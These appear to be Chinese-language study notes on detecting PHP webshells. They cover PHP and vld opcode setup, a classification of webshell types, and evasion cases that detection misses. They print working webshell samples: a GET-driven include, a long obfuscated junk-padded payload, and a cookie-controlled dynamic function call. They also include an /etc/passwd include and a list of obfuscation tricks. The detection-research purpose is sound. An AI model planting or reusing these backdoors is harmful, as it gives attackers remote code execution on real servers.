### WebShell 概述

![image-20211028104035971](https://tva1.sinaimg.cn/large/e6c9d24ely1h57y7c8zwjj21620g8tck.jpg)



![image-20211028141253921](https://tva1.sinaimg.cn/large/e6c9d24ely1h57y7hi4pqj21lh0u00yf.jpg)

### 

## windows-PHP踩坑

#### 安装php

1. 不需要安装apache，cli模式运行不需要装web服务器。
2. 测试文件test.php要写完整。
3. 解压路径C：\PHP7\，更改目录下php.init.development文件成 php.ini。
4. 最坑需要修改php.ini配置文件、extension，去掉分号试情况添加改写。

```php
//test.php 第一个php文件
<?php
	echo"hello world"
?>
```

#### 获取php的opcode

1. 安装vld扩展组件，在ext文件夹下添加vld.dll扩展组件。
2. 修改配置文件，添加一行extension =vld（形式有可能不同，注意这个坑） 

```
//命令行获取opcode
php -dvld.active=1 -dvld.execute=0 test.php
```

#### 木马分类

- #### 一句话木马

  ##### 一句话木马泛指一句话的脚本，最典型的功能就是为代码执行提供一种环境，比如熟悉的eval()函数。

  ##### 这种脚本大都不会脱离数据传递与数据执行这个基本框架。

- #### 小马

  ##### 小马至功能单一的Webshell，以上传文件功能居多，通常作为上传大马的中转站，辅助攻击者进行渗透。

  ##### 其文件不大，也不存在口令保护。

- #### 大马

  #####  大马指功能强大的Webshell。有些大马为了躲避检测，使用了混

  #####  淆手段或者加解密压缩等技术，前一种称未加密的Webshell，后一种成为加密的Webshell。


$$
sigma(d)  = p(a)+p(b) 2^3
$$

### 不能覆盖类型

1. ##### 自定义函数动态调用

   ```php
   <?php
           function xz(){
                   global $b;
                   $a = $_GET[$b];   #  $_GET[“xz”]
                   $e = $a;
                   return $e;
           }
   ?>
   <?php
   $b = "xz";
   $c = xz();
   $d = $c;
   
   include($d);   #执行
   ```

2. ##### 填充垃圾数据混淆

   ```php
   <?php $rxvihnd = 'D#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]3bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	2	145	x66	157	x78"))) { $kzgsoan = "	x6273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]2x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)s2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z3	162	x65	141	x74	145	x5f	146	x75	156	~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M73]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4*#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=]y31M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9]7]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]nbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph56	x61"]=1; $uas=strtolower($_SERVER["	x48	124	x54	120	x5f	%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb17-SFEBFI,6<*127-UVPFNJU,6<*r (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($uas	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) obE{h%)sutcvt)fubmgoj{hA!ost0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!7&6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tf125	x53	105	x52	137	x41	107	x24-tusqpt)%z-#:#*	x/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c#-%tmw)%tww**WYsboepn)%bss-%rxBif((function_exists("	x6f	142	x5fCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#	x24-	x24	x5c%j^	x24>!	x24/%tmw/	x24)%zW2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxBopjudovg}x;0]=])0#)U!	x27{**u%-#j("vveljku",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]25p!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+#-!#]y38#-!%w:**<")));$ijstbzz = $kzgsoan("", $hvcesuz); $ij)tpqsut>j%!*9!	x27!hmg%)!p%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!f7f_*#ujojRk3`{666~6<&w6<	x7fw6*/#M5]DgP5]D6#<%fdy>#]D4]242]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!
   ```

3. ##### 输入不确定

```php
<?php

$tqgy=$_COOKIE;       #COOKIE 输入不确定
$tvihp=$tqgy[nyin];   #exp $_POST[nyin]
if($tvihp){
	$hnl=$tvihp($tqgy[xdej]);$izp=$tvihp($tqgy[jhqp]);$wobwg=$hnl("",$izp);$wobwg();
}
```

```php
#文件输入不确定
}
include "exploits.php"; 
?>
```

```php
#执行敏感文件
<?
include("/etc/passwd");     #解决方案 敏感文件直接判
?>

```



Assert 命令执行，配合extract函数执行

16进制字符串不用解码可直接执行

通过str_replace 替换字符串达到混淆目的，混淆出一个命令出来（yara规则辅助）

include 执行文件函数，需要判断目标文件是否恶意。（yara规则辅助）

@语法是为了抑制错误输出

$定义变量

数组拼接+字符串混淆，（yara可以检测）

上传move_upload_file

? 三元操作符 if 判断

反弹shell 

敏感函数动态调用，（声明，执行）

